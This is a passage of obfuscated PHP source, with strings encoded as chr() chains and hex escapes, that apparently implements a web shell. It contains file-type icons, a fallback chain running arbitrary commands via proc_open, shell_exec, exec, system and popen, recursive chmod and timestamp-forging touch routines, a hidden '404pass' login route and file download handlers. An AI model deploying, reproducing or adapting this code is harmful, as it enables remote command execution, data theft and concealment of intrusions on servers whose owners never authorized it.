        chr(105).chr(109).chr(103) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(53).chr(104).chr(49).chr(54).chr(118).chr(49).chr(52).chr(72).chr(52).chr(122).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(99).chr(105).chr(114).chr(99).chr(108).chr(101).chr(32).chr(99).chr(120).chr(61).chr(34).chr(56).chr(46).chr(53).chr(34).chr(32).chr(99).chr(121).chr(61).chr(34).chr(57).chr(46).chr(53).chr(34).chr(32).chr(114).chr(61).chr(34).chr(49).chr(46).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(49).chr(54).chr(108).chr(52).chr(45).chr(52).chr(32).chr(51).chr(32).chr(51).chr(32).chr(51).chr(45).chr(50).chr(32).chr(54).chr(32).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(112).chr(100).chr(102) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_328698 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(55).chr(108).chr(53).chr(32).chr(53).chr(118).chr(49).chr(49).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(116).chr(101).chr(120).chr(116).chr(32).chr(120).chr(61).chr(34).chr(55).chr(34).chr(32).chr(121).chr(61).chr(34).chr(49).chr(55).chr(34).chr(32).chr(102).chr(111).chr(110).chr(116).chr(45).chr(115).chr(105).chr(122).chr(101).chr(61).chr(34).chr(56).chr(34).chr(32).chr(102).chr(111).chr(110).chr(116).chr(45).chr(102).chr(97).chr(109).chr(105).chr(108).chr(121).chr(61).chr(34).chr(117).chr(105).chr(45).chr(115).chr(97).chr(110).chr(115).chr(45).chr(115).chr(101).chr(114).chr(105).chr(102).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(62).chr(80).chr(68).chr(70).chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(115).chr(104).chr(101).chr(101).chr(116) => "\x3c\x73\x76\x67\x20\x76\x69\x65\x77\x42\x6f\x78\x3d\x22\x30\x20\x30\x20\x32\x34\x20\x32\x34\x22\x20\x63\x6c\x61\x73\x73\x3d\x22" . $_328698 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(49).chr(50).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(50).chr(32).chr(50).chr(118).chr(49).chr(52).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(56).chr(32).chr(56).chr(104).chr(56).chr(77).chr(56).chr(32).chr(49).chr(50).chr(104).chr(56).chr(77).chr(56).chr(32).chr(49).chr(54).chr(104).chr(56).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(122).chr(105).chr(112) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . chr(34).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(54).chr(32).chr(51).chr(104).chr(55).chr(108).chr(53).chr(32).chr(53).chr(118).chr(49).chr(49).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(32).chr(50).chr(72).chr(54).chr(97).chr(50).chr(32).chr(50).chr(32).chr(48).chr(32).chr(48).chr(49).chr(45).chr(50).chr(45).chr(50).chr(86).chr(53).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(49).chr(49).chr(32).chr(53).chr(104).chr(50).chr(118).chr(50).chr(104).chr(45).chr(50).chr(118).chr(50).chr(104).chr(50).chr(118).chr(50).chr(104).chr(45).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        "\x64\x62" => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . chr(34).chr(62).chr(60).chr(101).chr(108).chr(108).chr(105).chr(112).chr(115).chr(101).chr(32).chr(99).chr(120).chr(61).chr(34).chr(49).chr(50).chr(34).chr(32).chr(99).chr(121).chr(61).chr(34).chr(54).chr(34).chr(32).chr(114).chr(120).chr(61).chr(34).chr(56).chr(34).chr(32).chr(114).chr(121).chr(61).chr(34).chr(51).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(111).chr(112).chr(97).chr(99).chr(105).chr(116).chr(121).chr(61).chr(34).chr(46).chr(49).chr(50).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(52).chr(32).chr(54).chr(118).chr(49).chr(50).chr(99).chr(48).chr(32).chr(49).chr(46).chr(55).chr(32).chr(51).chr(46).chr(54).chr(32).chr(51).chr(32).chr(56).chr(32).chr(51).chr(115).chr(56).chr(45).chr(49).chr(46).chr(51).chr(32).chr(56).chr(45).chr(51).chr(86).chr(54).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
        chr(115).chr(101).chr(97).chr(114).chr(99).chr(104) => chr(60).chr(115).chr(118).chr(103).chr(32).chr(118).chr(105).chr(101).chr(119).chr(66).chr(111).chr(120).chr(61).chr(34).chr(48).chr(32).chr(48).chr(32).chr(50).chr(52).chr(32).chr(50).chr(52).chr(34).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34) . $_328698 . chr(34).chr(62).chr(60).chr(99).chr(105).chr(114).chr(99).chr(108).chr(101).chr(32).chr(99).chr(120).chr(61).chr(34).chr(49).chr(49).chr(34).chr(32).chr(99).chr(121).chr(61).chr(34).chr(49).chr(49).chr(34).chr(32).chr(114).chr(61).chr(34).chr(55).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(102).chr(105).chr(108).chr(108).chr(61).chr(34).chr(110).chr(111).chr(110).chr(101).chr(34).chr(47).chr(62).chr(60).chr(112).chr(97).chr(116).chr(104).chr(32).chr(100).chr(61).chr(34).chr(77).chr(50).chr(48).chr(32).chr(50).chr(48).chr(108).chr(45).chr(51).chr(45).chr(51).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(61).chr(34).chr(99).chr(117).chr(114).chr(114).chr(101).chr(110).chr(116).chr(67).chr(111).chr(108).chr(111).chr(114).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(119).chr(105).chr(100).chr(116).chr(104).chr(61).chr(34).chr(50).chr(34).chr(32).chr(115).chr(116).chr(114).chr(111).chr(107).chr(101).chr(45).chr(108).chr(105).chr(110).chr(101).chr(99).chr(97).chr(112).chr(61).chr(34).chr(114).chr(111).chr(117).chr(110).chr(100).chr(34).chr(47).chr(62).chr(60).chr(47).chr(115).chr(118).chr(103).chr(62),
    );
    return isset($_ad0b2e[$_aa96df]) ? $_ad0b2e[$_aa96df] : $_ad0b2e[chr(102).chr(105).chr(108).chr(101)];
}
function _f6879b162($_71ae88)
{
    if (is_dir($_71ae88))
        return _f753d4f74("\x66\x6f\x6c\x64\x65\x72");
    $_5be2f1 = strtolower(pathinfo($_71ae88, PATHINFO_EXTENSION));
    if (in_array($_5be2f1, array(chr(122).chr(105).chr(112), chr(114).chr(97).chr(114), chr(55).chr(122))))
        return _f753d4f74("\x7a\x69\x70");
    if (in_array($_5be2f1, array(chr(106).chr(112).chr(103), "\x6a\x70\x65\x67", "\x70\x6e\x67", chr(103).chr(105).chr(102), chr(119).chr(101).chr(98).chr(112), "\x62\x6d\x70", chr(115).chr(118).chr(103))))
        return _f753d4f74(chr(105).chr(109).chr(103));
    if (in_array($_5be2f1, array("\x70\x64\x66")))
        return _f753d4f74("\x70\x64\x66");
    if (in_array($_5be2f1, array("\x63\x73\x76", "\x78\x6c\x73", "\x78\x6c\x73\x78")))
        return _f753d4f74("\x73\x68\x65\x65\x74");
    if (in_array($_5be2f1, array("\x73\x71\x6c")))
        return _f753d4f74(chr(100).chr(98));
    if (in_array($_5be2f1, array(chr(112).chr(104).chr(112), "\x6a\x73", chr(116).chr(115), chr(99).chr(115).chr(115), chr(115).chr(99).chr(115).chr(115), chr(108).chr(101).chr(115).chr(115), "\x68\x74\x6d\x6c", chr(104).chr(116).chr(109), "\x78\x6d\x6c", "\x79\x6d\x6c", "\x79\x61\x6d\x6c", chr(105).chr(110).chr(105), chr(99).chr(102).chr(103))))
        return _f753d4f74("\x63\x6f\x64\x65");
    if (in_array($_5be2f1, array("\x74\x78\x74", chr(109).chr(100), chr(108).chr(111).chr(103), chr(106).chr(115).chr(111).chr(110))))
        return _f753d4f74("\x74\x65\x78\x74");
    return _f753d4f74("\x66\x69\x6c\x65");
}


if (!function_exists("\x6d\x61\x6b\x65\x5f\x63\x64\x5f\x70\x72\x65\x66\x69\x78")) {
    function make_cd_prefix($_bcc73b)
    {
        if (!$_bcc73b)
            return "";
        if (DIRECTORY_SEPARATOR === "\x5c")
            return chr(99).chr(100).chr(32).chr(47).chr(100).chr(32) . escapeshellarg($_bcc73b) . "\x20\x26\x26\x20";
        return chr(99).chr(100).chr(32) . escapeshellarg($_bcc73b) . chr(32).chr(38).chr(38).chr(32);
    }
}
if (!function_exists(chr(119).chr(114).chr(97).chr(112).chr(95).chr(99).chr(109).chr(100).chr(95).chr(102).chr(111).chr(114).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108))) {
    function wrap_cmd_for_shell($_526084)
    {
        if (DIRECTORY_SEPARATOR === "\x5c")
            return "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x43\x20" . $_526084;
        return chr(47).chr(98).chr(105).chr(110).chr(47).chr(115).chr(104).chr(32).chr(45).chr(99).chr(32) . escapeshellarg($_526084);
    }
}


if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
    function run_with_proc_open($_526084, $_bcc73b = null, $_034161 = 30)
    {
        if (!is_fn_usable("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e"))
            return null;
        $_3a7899 = array(0 => array(chr(112).chr(105).chr(112).chr(101), chr(114)), 1 => array("\x70\x69\x70\x65", chr(119)), 2 => array("\x70\x69\x70\x65", "\x77"));
        $_a2410f = array();
        $_1592a4 = @proc_open($_526084, $_3a7899, $_a2410f, $_bcc73b ?: null, null);
        if (!is_resource($_1592a4))
            return null;
        if (isset($_a2410f[1]) && is_resource($_a2410f[1]))
            @stream_set_blocking($_a2410f[1], false);
        if (isset($_a2410f[2]) && is_resource($_a2410f[2]))
            @stream_set_blocking($_a2410f[2], false);
        if (isset($_a2410f[0]) && is_resource($_a2410f[0]))
            @fclose($_a2410f[0]);
        $_89658e = '';
        $_112c8e = time();
        while (true) {
            $_c2b0c4 = @proc_get_status($_1592a4);
            $_b45371 = $_c2b0c4 && !empty($_c2b0c4[chr(114).chr(117).chr(110).chr(110).chr(105).chr(110).chr(103)]);
            $_b0d457 = array();
            if (isset($_a2410f[1]) && is_resource($_a2410f[1]))
                $_b0d457[] = $_a2410f[1];
            if (isset($_a2410f[2]) && is_resource($_a2410f[2]))
                $_b0d457[] = $_a2410f[2];
            if ($_b0d457) {
                $_29a9ce = null;
                $_5be2f1 = null;
                @stream_select($_b0d457, $_29a9ce, $_5be2f1, 1);
                foreach ($_b0d457 as $_71ae88) {
                    $_860565 = @fread($_71ae88, 8192);
                    if ($_860565 !== false && $_860565 !== "")
                        $_89658e .= $_860565;
                }
            }
            else {
                usleep(100000);
            }
            if (!$_b45371)
                break;
            if ($_034161 > 0 && (time() - $_112c8e) >= $_034161) {
                @proc_terminate($_1592a4, 9);
                foreach ($_a2410f as $_71ae88) {
                    if (is_resource($_71ae88))
                        @fclose($_71ae88);
                }
                @proc_close($_1592a4);
                return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", chr(99).chr(111).chr(100).chr(101) => 124, chr(111).chr(117).chr(116) => $_89658e . "\n[timeout after {$_034161}s]");
            }
        }
        foreach ($_a2410f as $_71ae88) {
            if (is_resource($_71ae88))
                @fclose($_71ae88);
        }
        $_c66063 = @proc_close($_1592a4);
        if ($_c66063 === -1)
            $_c66063 = null;
        return array("\x6d\x65\x74\x68\x6f\x64" => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e", "\x63\x6f\x64\x65" => $_c66063, chr(111).chr(117).chr(116) => $_89658e);
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function run_with_shell_exec($_526084, $_bcc73b = null)
    {
        if (!is_fn_usable(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)))
            return null;
        $_e10a9b = make_cd_prefix($_bcc73b) . $_526084 . chr(32).chr(50).chr(62).chr(38).chr(49);
        $_36db60 = @shell_exec($_e10a9b);
        if ($_36db60 === null)
            return null;
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63", chr(99).chr(111).chr(100).chr(101) => null, chr(111).chr(117).chr(116) => $_36db60);
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function run_with_exec($_526084, $_bcc73b = null)
    {
        if (!is_fn_usable("\x65\x78\x65\x63"))
            return null;
        $_e10a9b = make_cd_prefix($_bcc73b) . $_526084 . "\x20\x32\x3e\x26\x31";
        $_e75cc4 = array();
        $_c66063 = 0;
        @exec($_e10a9b, $_e75cc4, $_c66063);
        return array(chr(109).chr(101).chr(116).chr(104).chr(111).chr(100) => chr(101).chr(120).chr(101).chr(99), chr(99).chr(111).chr(100).chr(101) => $_c66063, "\x6f\x75\x74" => implode("\x0a", (array)$_e75cc4));
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x73\x79\x73\x74\x65\x6d")) {
    function run_with_system($_526084, $_bcc73b = null)
    {
        if (!is_fn_usable("\x73\x79\x73\x74\x65\x6d"))
            return null;
        $_e10a9b = make_cd_prefix($_bcc73b) . $_526084 . chr(32).chr(50).chr(62).chr(38).chr(49);
        ob_start();
        @system($_e10a9b, $_c66063);
        $_36db60 = ob_get_clean();
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), "\x63\x6f\x64\x65" => $_c66063, "\x6f\x75\x74" => $_36db60);
    }
}
if (!function_exists("\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x70\x6f\x70\x65\x6e")) {
    function run_with_popen($_526084, $_bcc73b = null)
    {
        if (!is_fn_usable(chr(112).chr(111).chr(112).chr(101).chr(110)))
            return null;
        $_e10a9b = make_cd_prefix($_bcc73b) . $_526084 . "\x20\x32\x3e\x26\x31";
        $_66f6b0 = @popen(wrap_cmd_for_shell($_e10a9b), chr(114));
        if (!is_resource($_66f6b0))
            return null;
        $_89658e = "";
        while (!feof($_66f6b0)) {
            $_860565 = @fread($_66f6b0, 8192);
            if ($_860565 === false)
                break;
            $_89658e .= $_860565;
        }
        @pclose($_66f6b0);
        return array("\x6d\x65\x74\x68\x6f\x64" => chr(112).chr(111).chr(112).chr(101).chr(110), "\x63\x6f\x64\x65" => null, "\x6f\x75\x74" => $_89658e);
    }
}
if (!function_exists(chr(114).chr(117).chr(110).chr(95).chr(99).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(95).chr(97).chr(108).chr(108))) {
    function run_command_all($_526084, $_bcc73b = null)
    {
        $_cbd7ef = run_with_proc_open($_526084, $_bcc73b, 30);
        if ($_cbd7ef)
            return $_cbd7ef;
        $_417d6a = array(chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99), "\x72\x75\x6e\x5f\x77\x69\x74\x68\x5f\x65\x78\x65\x63", chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109), chr(114).chr(117).chr(110).chr(95).chr(119).chr(105).chr(116).chr(104).chr(95).chr(112).chr(111).chr(112).chr(101).chr(110));
        foreach ($_417d6a as $_fe4e19) {
            if (function_exists($_fe4e19)) {
                $_8ed213 = $_fe4e19($_526084, $_bcc73b);
                if ($_8ed213)
                    return $_8ed213;
            }
        }
        return array("\x6d\x65\x74\x68\x6f\x64" => "\x6e\x6f\x6e\x65", "\x63\x6f\x64\x65" => 127, "\x6f\x75\x74" => chr(67).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(114).chr(117).chr(110).chr(110).chr(101).chr(114).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101).chr(32).chr(111).chr(110).chr(32).chr(116).chr(104).chr(105).chr(115).chr(32).chr(80).chr(72).chr(80).chr(32).chr(98).chr(117).chr(105).chr(108).chr(100).chr(46));
    }
}


function _f3dae0521($_1db743, $_d92393, $_ead039, &$_9ece03)
{
    if (!@chmod($_1db743, $_d92393))
        $_9ece03 = false;
    if ($_ead039 && is_dir($_1db743)) {
        $_66f6b0 = @opendir($_1db743);
        if ($_66f6b0 !== false) {
            while (false !== ($_52ceb2 = readdir($_66f6b0))) {
                if ($_52ceb2 === "\x2e" || $_52ceb2 === chr(46).chr(46))
                    continue;
                _f3dae0521($_1db743 . DIRECTORY_SEPARATOR . $_52ceb2, $_d92393, true, $_9ece03);
            }
            closedir($_66f6b0);
        }
        else {
            $_9ece03 = false;
        }
    }
}
function _f448d7910($_1db743, $_398f95, $_ead039, &$_9ece03)
{
    if (!@touch($_1db743, $_398f95, $_398f95))
        $_9ece03 = false;
    if ($_ead039 && is_dir($_1db743)) {
        $_66f6b0 = @opendir($_1db743);
        if ($_66f6b0 !== false) {
            while (false !== ($_52ceb2 = readdir($_66f6b0))) {
                if ($_52ceb2 === "\x2e" || $_52ceb2 === "\x2e\x2e")
                    continue;
                _f448d7910($_1db743 . DIRECTORY_SEPARATOR . $_52ceb2, $_398f95, true, $_9ece03);
            }
            closedir($_66f6b0);
        }
        else {
            $_9ece03 = false;
        }
    }
}


$_cf79f1 = isset($_GET[chr(112)]) ? (string)$_GET["\x70"] : getcwd();
if (!is_dir($_cf79f1))
    $_cf79f1 = getcwd();
$_cf79f1 = rtrim($_cf79f1, DIRECTORY_SEPARATOR);
if ($_cf79f1 === "")
    $_cf79f1 = DIRECTORY_SEPARATOR;

$_34a35d = isset($_GET[chr(97)]) ? $_GET["\x61"] : "";


if ($_34a35d === "\x34\x30\x34\x70\x61\x73\x73" && $_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === chr(80).chr(79).chr(83).chr(84)) {
    _f66d060dd();
    $_71ae88 = isset($_POST["\x70\x61\x73\x73"]) ? $_POST["\x70\x61\x73\x73"] : "";
    if (_f96fc16b7($_71ae88, AUTH_PASS_HASH)) {
        $_SESSION["\x61\x75\x74\x68"] = true;
        $_SESSION["\x77\x68\x6f"] = AUTH_USER;
        header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_cf79f1));
        exit;
    }
    _f7c8a31a2();
    exit;
}
if ($_34a35d === "\x6c\x6f\x67\x69\x6e" && $_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === "\x50\x4f\x53\x54") {
    _f66d060dd();
    $_8f784a = isset($_POST[chr(117).chr(115).chr(101).chr(114)]) ? $_POST[chr(117).chr(115).chr(101).chr(114)] : '';
    $_71ae88 = isset($_POST[chr(112).chr(97).chr(115).chr(115)]) ? $_POST[chr(112).chr(97).chr(115).chr(115)] : "";
    if (_f21b99f17($_8f784a, $_71ae88)) {
        $_SESSION[chr(97).chr(117).chr(116).chr(104)] = true;
        $_SESSION["\x77\x68\x6f"] = $_8f784a;
        header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(112).chr(61) . rawurlencode($_cf79f1));
        exit;
    }
    else {
        _fd9d1ecc8(chr(73).chr(110).chr(99).chr(111).chr(114).chr(114).chr(101).chr(99).chr(116).chr(32).chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101).chr(32).chr(111).chr(114).chr(32).chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100));
        exit;
    }
}
if (empty($_SESSION["\x61\x75\x74\x68"])) {
    _f7c8a31a2();
    exit;
}


if ($_34a35d === chr(100).chr(111).chr(119).chr(110).chr(108).chr(111).chr(97).chr(100)) {
    $_bc8cc3 = _f46d3561b($_cf79f1, isset($_GET[chr(102)]) ? $_GET[chr(102)] : '');
    if (!is_file($_bc8cc3) || !is_readable($_bc8cc3)) {
        http_response_code(404);
        exit("\x4e\x6f\x74\x20\x66\x6f\x75\x6e\x64");
    }
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($_bc8cc3) . "\x22");
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20" . filesize($_bc8cc3));
    header(chr(88).chr(45).chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(110).chr(111).chr(115).chr(110).chr(105).chr(102).chr(102));
    readfile($_bc8cc3);
    exit;
}


if ($_34a35d === chr(114).chr(97).chr(119)) {
    $_bc8cc3 = _f46d3561b($_cf79f1, isset($_GET["\x66"]) ? $_GET[chr(102)] : '');
    if (!is_file($_bc8cc3) || !is_readable($_bc8cc3)) {
        http_response_code(404);
        exit(chr(78).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));
    }
